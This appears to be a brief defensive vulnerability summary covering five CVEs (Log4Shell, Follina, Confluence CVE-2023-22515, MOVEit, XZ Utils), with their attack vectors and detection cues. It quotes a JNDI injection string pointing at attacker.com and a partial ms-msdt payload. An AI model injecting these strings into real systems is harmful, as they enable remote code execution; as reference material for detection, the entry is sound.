content: Log4Shell (CVE-2021-44228) is a critical RCE vulnerability in Apache Log4j 2.x. Exploitation via JNDI injection: ${jndi:ldap://attacker.com/a}. Common targets: Java web applications, Elasticsearch, Minecraft servers. Detection: ${jndi: patterns in request headers, POST bodies, User-Agent.

Follina (CVE-2022-30190) allows RCE via Microsoft Word/RTF documents exploiting ms-msdt protocol. Attack vector: Malicious Word documents with remote template injection. Payload example: ms-msdt:/id PCWDiagnostic /skip force /param. Detection: .docx with external relationships, suspicious ms-msdt URIs.

Atlassian Confluence privilege escalation (CVE-2023-22515). Unauthenticated attackers can create admin accounts via /setup/* endpoints. Affects Confluence Data Center and Server 8.0.x-8.5.3. Detection: Unusual admin account creation, /setup/ access in logs, versions in vulnerable range.

MOVEit Transfer SQL injection (CVE-2023-34362) allows unauthenticated attackers to access database. Exploited by Cl0p ransomware group. Attack vector: SQL injection in web application. Detection: Unusual database queries, unauthorized file access, suspicious POST requests to /moveitisapi/.

XZ Utils backdoor (CVE-2024-3094) in liblzma affecting SSH authentication. Malicious code in xz 5.6.0-5.6.1 compromises sshd. Detection: xz versions 5.6.0-5.6.1, unusual SSH behavior, ifunc-based backdoor signatures. Impact: RCE on affected Linux systems.
